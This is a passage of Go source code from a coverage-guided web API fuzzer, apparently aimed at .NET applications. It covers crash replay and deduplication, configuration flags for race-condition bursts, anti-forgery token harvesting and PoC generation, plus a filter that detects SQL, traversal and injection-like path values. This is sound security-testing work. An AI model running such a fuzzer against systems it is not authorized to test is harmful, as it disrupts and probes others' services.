	if i := strings.Index(path, "?"); i >= 0 {
		base, query = path[:i], path[i:]
	}
	loc := pathIDSegmentRe.FindStringIndex(base)
	if loc == nil {
		return "", ""
	}
	// loc[0]+1 is the start of the captured ID (skip the leading '/').
	segStart := loc[0] + 1
	// End of the ID token: find the next '/', '?' or end of string.
	segEnd := segStart
	for segEnd < len(base) && base[segEnd] != '/' && base[segEnd] != '?' {
		segEnd++
	}
	newVal := pathMutationValues[rand.Intn(len(pathMutationValues))]
	mutated := base[:segStart] + newVal + base[segEnd:] + query
	return mutated, "mutate_path"
}

// enqueueCrashReplay queues n follow-up work items after a unique crash is found.
// It re-renders the crashing template with varying mutation modes to find bug variants.
func (f *Fuzzer) enqueueCrashReplay(item WorkItem, n int) {
	if n <= 0 || f.isTemplateBlocked(item.TemplateID) {
		return
	}
	epKey := endpointKey(item.Method, normalizePath(item.Path))
	if f.cfg.CrashReplayPerEndpoint > 0 {
		remaining := f.cfg.CrashReplayPerEndpoint - f.replayByEndpoint[epKey]
		if remaining <= 0 {
			return
		}
		n = minInt(n, remaining)
	}
	queueMax := maxInt(1, f.cfg.CrashReplayQueueMax)
	added := 0
	modes := []string{"mutate", "havoc", "mutate", "havoc", "havoc"}
	for i := 0; i < n; i++ {
		if len(f.replayQueue) >= queueMax {
			break
		}
		mode := modes[i%len(modes)]
		depth := 1 + (i / len(modes))
		rendered, err := f.renderTemplate(item.TemplateID, mode, depth, -1)
		if err != nil {
			// Fall back to replaying the exact crashing item.
			replay := item
			replay.MutationLabel = fmt.Sprintf("crash_replay_%d", i)
			replay.MutationName = "crash_replay"
			replay.EpochName = "Replay"
			f.replayQueue = append(f.replayQueue, replay)
			added++
			continue
		}
		rendered.MutationLabel = "crash_replay+" + rendered.MutationLabel
		rendered.MutationName = "crash_replay"
		rendered.EpochName = "Replay"
		f.replayQueue = append(f.replayQueue, rendered)
		added++
	}
	if added > 0 {
		f.replayByEndpoint[epKey] += added
	}
}

// exceptionTypeRe matches .NET exception class names in response bodies.
// Covers: "System.ArgumentException:", "Nop.Core.NopException:" etc.
var exceptionTypeRe = regexp.MustCompile(`(?:^|\s)((?:[A-Za-z0-9]+\.)+[A-Za-z]*Exception)\s*:`)

// extractExceptionType pulls the first .NET exception class name out of a response body.
// Used when the X-Exception-Type response header is unavailable (HasStarted race).
func extractExceptionType(body string) string {
	if len(body) == 0 {
		return ""
	}
	// Scan first 4096 bytes — stack traces always start at the top of the response.
	scan := body
	if len(scan) > 4096 {
		scan = scan[:4096]
	}
	if m := exceptionTypeRe.FindStringSubmatch(scan); len(m) > 1 {
		// Return only the short class name (last segment), e.g. "ArgumentException"
		full := m[1]
		if dot := strings.LastIndex(full, "."); dot >= 0 {
			return full[dot+1:]
		}
		return full
	}
	return ""
}

func hashWithFNV(s string) string {
	h := fnv.New64a()
	_, _ = h.Write([]byte(s))
	return fmt.Sprintf("%x", h.Sum64())
}

func normalizeCrashPathSignature(path string, includeQueryValues bool) string {
	norm := strings.TrimSpace(normalizePath(path))
	if norm == "" {
		return "/"
	}
	base := norm
	rawQuery := ""
	if i := strings.Index(norm, "?"); i >= 0 {
		base, rawQuery = norm[:i], norm[i+1:]
	}
	baseNorm := normalizeEndpointPath(base)
	if strings.TrimSpace(rawQuery) == "" {
		return baseNorm
	}
	q, err := url.ParseQuery(rawQuery)
	if err != nil || len(q) == 0 {
		if includeQueryValues {
			return baseNorm + "?" + truncate(strings.TrimSpace(rawQuery), 120)
		}
		return baseNorm
	}
	keys := make([]string, 0, len(q))
	for k := range q {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	parts := make([]string, 0, len(keys))
	for _, k := range keys {
		ck := canonicalKey(k)
		if ck == "" {
			continue
		}
		if !includeQueryValues {
			parts = append(parts, ck)
			continue
		}
		v := normalizeValue(q.Get(k))
		if len(v) > 80 {
			v = v[:80]
		}
		parts = append(parts, ck+"="+v)
	}
	if len(parts) == 0 {
		return baseNorm
	}
	return baseNorm + "?" + strings.Join(parts, "&")
}

func normalizeCrashMutationLabel(label string) string {
	src := strings.TrimSpace(label)
	if src == "" {
		return ""
	}
	raw := strings.Split(src, "+")
	out := make([]string, 0, len(raw))
	for _, p := range raw {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		switch {
		case strings.HasPrefix(p, "mcat_"):
			out = append(out, p)
		case strings.HasPrefix(p, "havoc("):
			out = append(out, "havoc")
		case strings.HasPrefix(p, "mutate_"):
			out = append(out, p)
		case strings.HasPrefix(p, "crash_replay"):
			out = append(out, "crash_replay")
		}
	}
	if len(out) == 0 {
		return truncate(src, 64)
	}
	return strings.Join(dedupStrings(out), "+")
}

func stableResponseFingerprint(body string) string {
	s := strings.TrimSpace(body)
	if s == "" {
		return ""
	}
	if len(s) > 4096 {
		s = s[:4096]
	}

	var obj map[string]any
	if json.Unmarshal([]byte(s), &obj) == nil && len(obj) > 0 {
		keys := []string{"type", "title", "status", "error", "message", "detail", "exception"}
		parts := make([]string, 0, len(keys))
		for _, k := range keys {
			v, ok := obj[k]
			if !ok {
				continue
			}
			vv := ""
			switch tv := v.(type) {
			case string:
				vv = tv
			case bool, json.Number, float64, float32, int, int32, int64, uint, uint32, uint64:
				vv = toString(tv)
			default:
				if b, err := json.Marshal(tv); err == nil {
					vv = string(b)
				} else {
					vv = toString(tv)
				}
			}
			vv = strings.TrimSpace(vv)
			if vv == "" {
				continue
			}
			vv = reUUIDBody.ReplaceAllString(vv, "<uuid>")
			vv = reHexLongBody.ReplaceAllString(vv, "<hex>")
			vv = reNumLongBody.ReplaceAllString(vv, "<num>")
			if len(vv) > 120 {
				vv = vv[:120]
			}
			parts = append(parts, canonicalKey(k)+"="+vv)
		}
		if len(parts) > 0 {
			return hashWithFNV(strings.Join(parts, "|"))
		}
	}

	s = reTraceIDField.ReplaceAllString(s, `"traceId":"<id>"`)
	s = reRequestIDField.ReplaceAllString(s, `"requestId":"<id>"`)
	s = reUUIDBody.ReplaceAllString(s, "<uuid>")
	s = reHexLongBody.ReplaceAllString(s, "<hex>")
	s = reNumLongBody.ReplaceAllString(s, "<num>")
	s = strings.Join(strings.Fields(s), " ")
	if len(s) > 256 {
		s = s[:256]
	}
	return hashWithFNV(s)
}

func (f *Fuzzer) crashSignature(method, path string, status int, mutation, exceptionType, responseBody string) string {
	normPath := normalizeCrashPathSignature(path, f.cfg.CrashSigQueryValues)
	ex := strings.ToLower(strings.TrimSpace(exceptionType))
	mut := normalizeCrashMutationLabel(mutation)
	respFP := stableResponseFingerprint(responseBody)

	parts := []string{
		strings.ToUpper(strings.TrimSpace(method)),
		normPath,
		strconv.Itoa(status),
	}

	switch f.cfg.CrashSignatureMode {
	case "strict":
		if ex != "" {
			parts = append(parts, "ex="+ex)
		}
		if respFP != "" {
			parts = append(parts, "resp="+respFP)
		}
		if f.cfg.CrashSigMutation && mut != "" {
			parts = append(parts, "mut="+mut)
		}
	case "coarse":
		if ex != "" {
			parts = append(parts, "ex="+ex)
		} else if respFP != "" {
			parts = append(parts, "resp="+respFP)
		}
	default: // balanced
		if ex != "" {
			parts = append(parts, "ex="+ex)
		} else if respFP != "" {
			parts = append(parts, "resp="+respFP)
		}
		if f.cfg.CrashSigMutation && mut != "" {
			parts = append(parts, "mut="+mut)
		}
	}
	if len(parts) == 3 {
		if respFP != "" {
			parts = append(parts, "resp="+respFP)
		} else if mut != "" {
			parts = append(parts, "mut="+mut)
		} else {
			parts = append(parts, "generic")
		}
	}
	return hashWithFNV(strings.Join(parts, "|"))
}

func parseFlags() Config {
	nowTS := time.Now().Format("20060102-150405")
	cfg := Config{}
	flag.StringVar(&cfg.GrammarDir, "grammar", ".", "Path to directory containing grammar.py and dict.json")
	flag.StringVar(&cfg.SourceDir, "src", "", "Path to source tree for source-aware endpoint prioritization")
	flag.StringVar(&cfg.DictPath, "dict", "", "Path to custom JSON dictionary")
	flag.StringVar(&cfg.TemplatesJSON, "templates-json", "", "Path to exported templates JSON (default: <grammar>/templates.export.json)")
	flag.BoolVar(&cfg.RefreshTemplates, "refresh-templates", false, "Re-export templates from grammar.py even if templates JSON exists")
	flag.StringVar(&cfg.ExporterPath, "exporter", "./export-templates.py", "Path to export-templates.py")
	flag.Float64Var(&cfg.TimeBudgetMinutes, "time-budget", 10, "Minutes")
	flag.IntVar(&cfg.Concurrency, "concurrency", 10, "Parallel requests")
	flag.IntVar(&cfg.MinConcurrency, "min-concurrency", 1, "Adaptive min concurrency")
	flag.IntVar(&cfg.MaxConcurrency, "max-concurrency", 64, "Adaptive max concurrency")
	flag.BoolVar(&cfg.AdaptiveConcurrency, "adaptive-concurrency", true, "Enable adaptive concurrency")
	flag.BoolVar(&cfg.AdaptiveContentType, "adaptive-content-type", true, "Adapt request Content-Type per endpoint using response feedback")
	flag.BoolVar(&cfg.AutoAntiForgery, "auto-antiforgery", true, "Auto-harvest and inject anti-forgery tokens for MVC form endpoints")
	flag.StringVar(&cfg.AntiForgeryField, "antiforgery-field", "__RequestVerificationToken", "Anti-forgery form field name")
	flag.StringVar(&cfg.AntiForgeryHeader, "antiforgery-header", "RequestVerificationToken", "Anti-forgery request header name")
	flag.Float64Var(&cfg.AntiForgeryCooldown, "antiforgery-cooldown", 10.0, "Cooldown seconds between anti-forgery harvest attempts per endpoint")
	flag.Float64Var(&cfg.AntiForgerySampleRate, "antiforgery-sample-rate", 0.10, "Sample rate for passive anti-forgery token harvest from HTML responses")
	flag.IntVar(&cfg.AntiForgeryMaxTokens, "antiforgery-max-tokens", 2048, "Max anti-forgery tokens kept in runtime pool")
	flag.Float64Var(&cfg.AntiForgeryTokenTTL, "antiforgery-token-ttl", 300.0, "Anti-forgery token TTL seconds in runtime pool")
	flag.Float64Var(&cfg.RequestTimeoutSec, "request-timeout", 5.0, "Per-request timeout seconds")
	flag.IntVar(&cfg.MaxResponseBytes, "max-response-bytes", 262144, "Max bytes to decode from successful responses")
	flag.IntVar(&cfg.CoverageInterval, "coverage-interval", 1, "Read coverage once every N completed requests")
	flag.IntVar(&cfg.CoverageBitmapSize, "coverage-bitmap-size", defaultSHMBitmapSize, "Desired SHM bitmap size in bytes for direct SHM mode")
	flag.IntVar(&cfg.EndpointStallReqs, "endpoint-stall-reqs", 220, "Down-weight endpoint after this many requests without new edges")
	flag.IntVar(&cfg.EndpointZeroEdgeReqs, "endpoint-zero-edge-reqs", 120, "Down-weight endpoint when total requests exceed threshold but no edges found")
	flag.BoolVar(&cfg.DirectSHM, "direct-shm", false, "Read coverage bitmap directly from SHM file")
	flag.StringVar(&cfg.SHMPath, "shm-path", "/coverage_shm/bitmap", "Path to mmap bitmap")
	flag.StringVar(&cfg.SHMReadMode, "shm-read-mode", "file", "Direct SHM read mode: file|mmap|auto")
	flag.BoolVar(&cfg.SkipOnCrash, "skip-on-crash", false, "Remove endpoint from active set after 5xx")
	flag.BoolVar(&cfg.SkipEndpointOn500, "skip-endpoint-on-500", false, "Stop fuzzing endpoint after first HTTP 500")
	flag.BoolVar(&cfg.SequentialBaseline, "sequential-baseline", false, "Run baseline epoch sequentially")
	flag.BoolVar(&cfg.SourceAwarePriority, "source-aware-priority", true, "Prioritize sensitive endpoints using source + route heuristics")
	flag.BoolVar(&cfg.RaceMode, "race-mode", true, "Enable conflict/race burst scheduling for stateful write endpoints")
	flag.IntVar(&cfg.RaceBurst, "race-burst", 4, "Number of concurrent conflicting requests to enqueue in race mode")
	flag.Float64Var(&cfg.RaceProb, "race-prob", 0.10, "Probability to enqueue race burst after successful write")
	flag.BoolVar(&cfg.CrashTriage, "crash-triage", true, "Classify crashes (noise vs likely vuln) with severity scoring")
	flag.StringVar(&cfg.CrashSignatureMode, "crash-signature-mode", "balanced", "Crash dedup signature mode: coarse|balanced|strict")
	flag.BoolVar(&cfg.CrashSigMutation, "crash-signature-mutation", false, "Include normalized mutation label in unique crash signature")
	flag.BoolVar(&cfg.CrashSigQueryValues, "crash-signature-query-values", false, "Include query values (not only query keys) in crash signature")
	flag.IntVar(&cfg.CrashReplayCount, "crash-replay-count", 4, "Follow-up replay requests per unique crash")
	flag.IntVar(&cfg.CrashReplayQueueMax, "crash-replay-queue-max", 96, "Global max queued crash replay requests")
	flag.IntVar(&cfg.CrashReplayPerEndpoint, "crash-replay-per-endpoint", 24, "Max replay requests per endpoint per run (0 = unlimited)")
	flag.Float64Var(&cfg.CrashReplayProb, "crash-replay-prob", 0.35, "Probability of draining crash replay queue on each scheduling step")
	flag.IntVar(&cfg.CrashBoostRequests, "crash-boost-requests", 80, "Temporary endpoint boost duration (requests) after a unique crash (0 = disable)")
	flag.IntVar(&cfg.CrashBoostMaxPerEndpoint, "crash-boost-max-per-endpoint", 2, "Max number of boost activations per endpoint")
	flag.Float64Var(&cfg.CrashBoostWeight, "crash-boost-weight", 8.0, "Template health weight while crash boost is active")
	flag.Float64Var(&cfg.EndpointReqShareCapPct, "endpoint-req-share-cap-pct", 2.0, "Soft cap on per-endpoint request share in percent when no new edges")
	flag.IntVar(&cfg.EndpointReqCapMinReqs, "endpoint-req-cap-min-reqs", 500, "Minimum requests before endpoint share cap applies")
	flag.Float64Var(&cfg.EndpointNoEdgeCapWeight, "endpoint-no-edge-cap-weight", 0.01, "Weight used when endpoint exceeds share cap without new edges")
	flag.IntVar(&cfg.EndpointCrashRateMinCrashes, "endpoint-crash-rate-min-crashes", 50, "Minimum 5xx count before crash-rate throttling applies")
	flag.Float64Var(&cfg.EndpointCrashRateThreshold, "endpoint-crash-rate-threshold", 50.0, "Crash-rate threshold in percent for endpoint throttling")
	flag.Float64Var(&cfg.EndpointCrashRateWeight, "endpoint-crash-rate-weight", 0.02, "Weight used for high crash-rate endpoints")
	flag.IntVar(&cfg.ReproRuns, "repro-runs", 5, "Repro check attempts for each unique crash (0 to disable)")
	flag.Float64Var(&cfg.ReproTargetPct, "repro-target", 80.0, "Target reproducibility percentage for confirmed crash")
	flag.Float64Var(&cfg.ReproTimeoutSec, "repro-timeout", 5.0, "Timeout per repro probe request")
	flag.BoolVar(&cfg.MinimizeCrash, "minimize-crash", true, "Run payload/path/query minimization on unique crashes")
	flag.IntVar(&cfg.MinimizeMaxProbes, "minimize-max-probes", 24, "Max probe requests for crash delta-reduction")
	flag.StringVar(&cfg.PocDir, "poc-dir", filepath.Join("./crashes", "pocs"), "Directory for generated reproducible PoC scripts")
	flag.StringVar(&cfg.TimelineDir, "timeline-dir", filepath.Join("./crashes", "timelines"), "Directory for generated Mermaid exploit timelines")
	flag.BoolVar(&cfg.MultiIdentity, "multi-identity", true, "Enable multi-identity scheduling from AUTH_IDENTITIES_JSON")
	flag.StringVar(&cfg.IdentitySampleMode, "identity-mode", "weighted", "Identity scheduling: weighted|round-robin|random")
	flag.BoolVar(&cfg.NoUI, "no-ui", false, "Disable live UI")
	flag.BoolVar(&cfg.ForceUI, "force-ui", false, "Force dashboard UI even when stdout is not a terminal")
	flag.BoolVar(&cfg.PlainUI, "plain-ui", false, "Use plain line-by-line UI instead of dashboard")
	flag.BoolVar(&cfg.UINoClear, "ui-no-clear", false, "Do not clear screen between dashboard refreshes")
	flag.BoolVar(&cfg.ASCIIUI, "ascii-ui", false, "Use ASCII borders/progress in dashboard")
	flag.IntVar(&cfg.UIWidth, "ui-width", 0, "Fixed dashboard width (80..200)")
	flag.Float64Var(&cfg.UIIntervalSec, "ui-interval", 1.0, "UI refresh interval seconds")
	flag.StringVar(&cfg.UIEndpointSort, "ui-endpoint-sort", "hot", "Live endpoint sort: hot|recent|req|edges|alpha")
	flag.BoolVar(&cfg.UIEndpointRotate, "ui-endpoint-rotate", true, "Rotate endpoint pages in live dashboard")
	flag.Float64Var(&cfg.UIEndpointRotateSec, "ui-endpoint-rotate-sec", 1.0, "Seconds between endpoint page rotation")
	flag.Float64Var(&cfg.SequenceProb, "sequence-prob", 0.30, "Probability of draining sequence queue")
	flag.IntVar(&cfg.SequenceMaxDepth, "sequence-max-depth", 3, "Maximum sequence chain depth")
	flag.IntVar(&cfg.SequenceFanout, "sequence-fanout", 6, "Maximum follow-up requests per successful step")
	flag.StringVar(&cfg.CrashFile, "crash-file", filepath.Join("./crashes", "crashes-"+nowTS+".jsonl"), "Path to all crash JSONL")
	flag.StringVar(&cfg.UniqueCrashFile, "unique-crash-file", filepath.Join("./crashes", "unique-crashes-"+nowTS+".jsonl"), "Path to unique crash JSONL")
	flag.StringVar(&cfg.SummaryFile, "summary-file", filepath.Join("./summaries", "summary-"+nowTS+".json"), "Path to run summary JSON")
	flag.StringVar(&cfg.ReportFile, "report-file", "", "Path to structured crash report JSON (default: derived from --summary-file)")
	flag.IntVar(&cfg.BootstrapMax, "bootstrap-max", 20, "Max GET requests in runtime bootstrap harvest")
	flag.Parse()

	cfg.GrammarDir = absPath(cfg.GrammarDir)
	cfg.SourceDir = absPath(cfg.SourceDir)
	cfg.CrashFile = absPath(cfg.CrashFile)
	cfg.UniqueCrashFile = absPath(cfg.UniqueCrashFile)
	cfg.SummaryFile = absPath(cfg.SummaryFile)
	if strings.TrimSpace(cfg.ReportFile) == "" {
		cfg.ReportFile = deriveReportPathFromSummary(cfg.SummaryFile)
	} else {
		cfg.ReportFile = absPath(cfg.ReportFile)
	}
	cfg.PocDir = absPath(cfg.PocDir)
	cfg.TimelineDir = absPath(cfg.TimelineDir)
	cfg.MinConcurrency = maxInt(1, cfg.MinConcurrency)
	cfg.MaxConcurrency = maxInt(cfg.MinConcurrency, cfg.MaxConcurrency)
	cfg.Concurrency = clampInt(maxInt(1, cfg.Concurrency), cfg.MinConcurrency, cfg.MaxConcurrency)
	cfg.SequenceMaxDepth = maxInt(1, cfg.SequenceMaxDepth)
	cfg.SequenceFanout = maxInt(1, cfg.SequenceFanout)
	cfg.CoverageInterval = maxInt(1, cfg.CoverageInterval)
	cfg.CoverageBitmapSize = maxInt(minSHMBitmapSize, cfg.CoverageBitmapSize)
	cfg.EndpointStallReqs = maxInt(20, cfg.EndpointStallReqs)
	cfg.EndpointZeroEdgeReqs = maxInt(20, cfg.EndpointZeroEdgeReqs)
	cfg.SHMReadMode = strings.ToLower(strings.TrimSpace(cfg.SHMReadMode))
	switch cfg.SHMReadMode {
	case "file", "mmap", "auto":
	default:
		cfg.SHMReadMode = "file"
	}
	cfg.UIIntervalSec = math.Max(0.2, cfg.UIIntervalSec)
	cfg.UIEndpointSort = strings.ToLower(strings.TrimSpace(cfg.UIEndpointSort))
	switch cfg.UIEndpointSort {
	case "hot", "recent", "req", "requests", "edges", "edge", "coverage", "alpha", "path":
	default:
		cfg.UIEndpointSort = "hot"
	}
	cfg.UIEndpointRotateSec = math.Max(0.5, cfg.UIEndpointRotateSec)
	cfg.AntiForgeryField = strings.TrimSpace(cfg.AntiForgeryField)
	if cfg.AntiForgeryField == "" {
		cfg.AntiForgeryField = "__RequestVerificationToken"
	}
	cfg.AntiForgeryHeader = strings.TrimSpace(cfg.AntiForgeryHeader)
	if cfg.AntiForgeryHeader == "" {
		cfg.AntiForgeryHeader = "RequestVerificationToken"
	}
	cfg.AntiForgeryCooldown = math.Max(0.5, cfg.AntiForgeryCooldown)
	cfg.AntiForgerySampleRate = clampFloat(cfg.AntiForgerySampleRate, 0.0, 1.0)
	cfg.AntiForgeryMaxTokens = maxInt(1, cfg.AntiForgeryMaxTokens)
	cfg.AntiForgeryTokenTTL = math.Max(0.0, cfg.AntiForgeryTokenTTL)
	cfg.RaceBurst = clampInt(cfg.RaceBurst, 2, 64)
	cfg.RaceProb = clampFloat(cfg.RaceProb, 0.0, 1.0)
	cfg.CrashSignatureMode = strings.ToLower(strings.TrimSpace(cfg.CrashSignatureMode))
	switch cfg.CrashSignatureMode {
	case "coarse", "balanced", "strict":
	default:
		cfg.CrashSignatureMode = "balanced"
	}
	cfg.CrashReplayCount = clampInt(cfg.CrashReplayCount, 0, 256)
	cfg.CrashReplayQueueMax = clampInt(cfg.CrashReplayQueueMax, 1, 10000)
	cfg.CrashReplayPerEndpoint = maxInt(0, cfg.CrashReplayPerEndpoint)
	cfg.CrashReplayProb = clampFloat(cfg.CrashReplayProb, 0.0, 1.0)
	cfg.CrashBoostRequests = maxInt(0, cfg.CrashBoostRequests)
	cfg.CrashBoostMaxPerEndpoint = maxInt(0, cfg.CrashBoostMaxPerEndpoint)
	cfg.CrashBoostWeight = math.Max(0.0, cfg.CrashBoostWeight)
	cfg.EndpointReqShareCapPct = clampFloat(cfg.EndpointReqShareCapPct, 0.0, 100.0)
	cfg.EndpointReqCapMinReqs = maxInt(1, cfg.EndpointReqCapMinReqs)
	cfg.EndpointNoEdgeCapWeight = clampFloat(cfg.EndpointNoEdgeCapWeight, 0.0, 1.0)
	cfg.EndpointCrashRateMinCrashes = maxInt(1, cfg.EndpointCrashRateMinCrashes)
	cfg.EndpointCrashRateThreshold = clampFloat(cfg.EndpointCrashRateThreshold, 0.0, 100.0)
	cfg.EndpointCrashRateWeight = clampFloat(cfg.EndpointCrashRateWeight, 0.0, 1.0)
	cfg.ReproRuns = clampInt(cfg.ReproRuns, 0, 20)
	cfg.ReproTargetPct = clampFloat(cfg.ReproTargetPct, 1.0, 100.0)
	cfg.ReproTimeoutSec = math.Max(0.2, cfg.ReproTimeoutSec)
	cfg.MinimizeMaxProbes = clampInt(cfg.MinimizeMaxProbes, 4, 200)
	cfg.IdentitySampleMode = strings.ToLower(strings.TrimSpace(cfg.IdentitySampleMode))
	switch cfg.IdentitySampleMode {
	case "weighted", "round-robin", "roundrobin", "rr", "random":
	default:
		cfg.IdentitySampleMode = "weighted"
	}
	if cfg.UIWidth > 0 {
		cfg.UIWidth = clampInt(cfg.UIWidth, 80, 200)
	}
	return cfg
}

func main() {
	rand.Seed(time.Now().UnixNano())
	cfg := parseFlags()
	f, err := NewFuzzer(cfg)
	if err != nil {
		fmt.Fprintf(os.Stderr, "init failed: %v\n", err)
		os.Exit(1)
	}
	defer f.Close()
	if err := f.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "run failed: %v\n", err)
		os.Exit(1)
	}
}

// --- generic helpers ---

func isTerminal(f *os.File) bool {
	if f == nil {
		return false
	}
	fi, err := f.Stat()
	if err != nil {
		return false
	}
	return (fi.Mode() & os.ModeCharDevice) != 0
}

func envOr(k, d string) string {
	if v := strings.TrimSpace(os.Getenv(k)); v != "" {
		return v
	}
	return d
}

func parseAuthHeadersJSON(raw string) map[string]string {
	out := map[string]string{}
	s := strings.TrimSpace(raw)
	if s == "" {
		return out
	}
	var m map[string]any
	if err := json.Unmarshal([]byte(s), &m); err != nil {
		return out
	}
	for k, v := range m {
		ks := strings.TrimSpace(k)
		vs := strings.TrimSpace(toString(v))
		if ks == "" || vs == "" {
			continue
		}
		out[ks] = vs
	}
	return out
}

func absPath(p string) string {
	if p == "" {
		return ""
	}
	a, err := filepath.Abs(p)
	if err != nil {
		return p
	}
	return a
}

func deriveReportPathFromSummary(summaryPath string) string {
	sumAbs := absPath(summaryPath)
	if strings.TrimSpace(sumAbs) == "" {
		return absPath(filepath.Join("./summaries", "report.json"))
	}

	dir := filepath.Dir(sumAbs)
	base := filepath.Base(sumAbs)
	ext := filepath.Ext(base)
	stem := strings.TrimSuffix(base, ext)
	if ext == "" {
		ext = ".json"
	}

	var reportName string
	switch {
	case strings.EqualFold(stem, "summary"):
		reportName = "report" + ext
	case strings.HasPrefix(stem, "summary-"):
		reportName = "report-" + strings.TrimPrefix(stem, "summary-") + ext
	default:
		reportName = stem + "-report" + ext
	}
	return filepath.Join(dir, reportName)
}

func ensureFileExists(path string, initialContent []byte) error {
	if strings.TrimSpace(path) == "" {
		return errors.New("empty output path")
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return err
	}
	if fi, err := os.Stat(path); err == nil {
		if fi.IsDir() {
			return fmt.Errorf("output path is a directory: %s", path)
		}
		return nil
	} else if !errors.Is(err, os.ErrNotExist) {
		return err
	}
	if len(initialContent) == 0 {
		initialContent = []byte{}
	}
	return os.WriteFile(path, initialContent, 0o644)
}

func fileExists(p string) bool {
	fi, err := os.Stat(p)
	return err == nil && !fi.IsDir()
}

func splitLines(s string) []string {
	s = strings.ReplaceAll(s, "\r\n", "\n")
	return strings.Split(s, "\n")
}

func normalizePath(path string) string {
	if i := strings.Index(path, "?"); i >= 0 {
		return path[:i]
	}
	return path
}

func splitPathTokens(path string) []string {
	p := strings.TrimSpace(normalizePath(path))
	p = strings.Trim(p, "/")
	if p == "" {
		return nil
	}
	out := strings.Split(p, "/")
	return out
}

func pathPlaceholderName(segment string) (string, bool) {
	s := strings.TrimSpace(segment)
	if len(s) < 3 || !strings.HasPrefix(s, "{") || !strings.HasSuffix(s, "}") {
		return "", false
	}
	name := strings.TrimSpace(strings.TrimSuffix(strings.TrimPrefix(s, "{"), "}"))
	if name == "" {
		return "", false
	}
	if i := strings.IndexAny(name, ":?"); i >= 0 {
		name = strings.TrimSpace(name[:i])
	}
	if name == "" {
		return "", false
	}
	return name, true
}

func isPathPlaceholderValue(v string) bool {
	s := strings.ToLower(strings.TrimSpace(v))
	if s == "" {
		return true
	}
	switch s {
	case "fuzzstring", "fuzzint", "fuzzbool", "fuzzuuid4", "fuzzuuid", "fuzzdate", "fuzzdatetime":
		return true
	}
	if strings.HasPrefix(s, "fuzz") || strings.HasPrefix(s, "custom_payload") {
		return true
	}
	return false
}

func normalizePathParamValue(v, fallback string) string {
	s := strings.TrimSpace(v)
	s = strings.Trim(s, "\"'")
	if s == "" {
		return fallback
	}
	// Reject any injection or special-char payloads from URL paths.
	// These produce garbage endpoint keys and confuse routing/coverage attribution.
	if strings.ContainsAny(s, "{}$%\r\n;@()*<>|`^~") {
		return fallback
	}
	// Also reject payloads that look like SQL, SSTI, or path traversal
	if strings.Contains(s, "..") || strings.Contains(s, "OR ") || strings.Contains(s, "SELECT") {
		return fallback
	}
	if strings.HasPrefix(s, "{") || strings.HasPrefix(s, "[") {
		return fallback
	}
	s = strings.ReplaceAll(s, "/", "-")
	s = strings.ReplaceAll(s, "\\", "-")
	s = strings.ReplaceAll(s, " ", "-")
	s = strings.ReplaceAll(s, "?", "-")
	s = strings.ReplaceAll(s, "#", "-")
	s = strings.ReplaceAll(s, "&", "-")
	s = strings.Trim(s, ".")
	if s == "" {
		return fallback
	}
	if len(s) > 96 {
		s = s[:96]
	}
	return s
}

func compactPayloadForUI(body string, maxLen int) string {
	b := strings.TrimSpace(body)
	if b == "" {
		return ""
	}
	if reJSONStartAny.MatchString(b) {
		return truncate(sanitizeText(strings.ReplaceAll(b, "\n", ""), maxLen*2), maxLen)
	}
	if strings.Contains(b, "=") {
		if vals, err := url.ParseQuery(b); err == nil && len(vals) > 0 {
			keys := make([]string, 0, len(vals))
			for k := range vals {
				keys = append(keys, k)
			}
			sort.Strings(keys)
			parts := make([]string, 0, 4)
			for _, k := range keys {
				arr := vals[k]
				if len(arr) == 0 {
					continue
				}
				v := sanitizeText(arr[0], 28)
				if len(v) > 24 {
					v = v[:24]
				}
				parts = append(parts, fmt.Sprintf("%s=%s", k, v))
				if len(parts) >= 3 {
					break
				}
			}
			if len(parts) > 0 {
				return truncate(strings.Join(parts, "&"), maxLen)
			}
		}
	}
	return truncate(sanitizeText(strings.ReplaceAll(b, "\n", ""), maxLen*2), maxLen)
}

func normalizeEndpointSegment(seg string) string {
	s := strings.TrimSpace(seg)
	if s == "" {
		return s
	}
	if len(s) > 64 {
		return "{long}"
	}
	if _, ok := pathPlaceholderName(s); ok {
		return "{param}"
	}
	low := strings.ToLower(s)
	if isPathPlaceholderValue(low) {
		return "{param}"
	}
	if strings.ContainsAny(s, "'\"<>$") {
		return "{param}"
	}
	if reUUIDLike.MatchString(s) {
		return "{uuid}"
	}
	if reAllDigits.MatchString(s) {
		return "{int}"
	}
	if reHexLong.MatchString(s) {
		return "{hex}"
	}
	if reBizIDLike.MatchString(s) {
		return "{id}"
	}
	if reDashIDToken.MatchString(s) && hasASCIIDigit(s) {
		return "{id}"
	}
	if len(s) >= 24 && strings.ContainsAny(s, "-_") {
		return "{id}"
	}
	return s
}

func hasASCIIDigit(s string) bool {
	for i := 0; i < len(s); i++ {
		if s[i] >= '0' && s[i] <= '9' {
			return true
		}
	}
	return false
}

func normalizeEndpointPath(path string) string {
	norm := strings.TrimSpace(normalizePath(path))
	if norm == "" || norm == "/" {
		return "/"
	}
	parts := splitPathTokens(norm)
	if len(parts) == 0 {
		return "/"
	}
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		out = append(out, normalizeEndpointSegment(p))
	}
	return "/" + strings.Join(out, "/")
}

func endpointKey(method, path string) string {
	return strings.ToUpper(strings.TrimSpace(method)) + " " + normalizeEndpointPath(path)
}

func isWriteMethod(method string) bool {
	switch strings.ToUpper(strings.TrimSpace(method)) {
	case "POST", "PUT", "PATCH", "DELETE":
		return true
	default:
		return false
	}
}

func isAPILikePath(path string) bool {
	p := strings.ToLower(strings.TrimSpace(normalizePath(path)))
	if strings.HasPrefix(p, "/api/") {
		return true
	}
	if reAPIVersion.MatchString(p) {
		return true
	}
	return false
}

func getHeaderCI(headers map[string]string, name string) string {
	for k, v := range headers {
		if strings.EqualFold(k, name) {
			return v
		}
	}
	return ""
}

func isFormLikeContentType(ct string) bool {
	low := strings.ToLower(strings.TrimSpace(ct))
	return strings.Contains(low, "application/x-www-form-urlencoded") || strings.Contains(low, "multipart/form-data")
}

func extractCookieValue(cookieHeader, name string) string {
	if strings.TrimSpace(cookieHeader) == "" || strings.TrimSpace(name) == "" {
		return ""
	}
	for _, part := range strings.Split(cookieHeader, ";") {
		p := strings.TrimSpace(part)
		if p == "" {
			continue
		}
		idx := strings.Index(p, "=")
		if idx <= 0 {
			continue
		}
		k := strings.TrimSpace(p[:idx])
		v := strings.TrimSpace(p[idx+1:])
		if strings.EqualFold(k, name) {
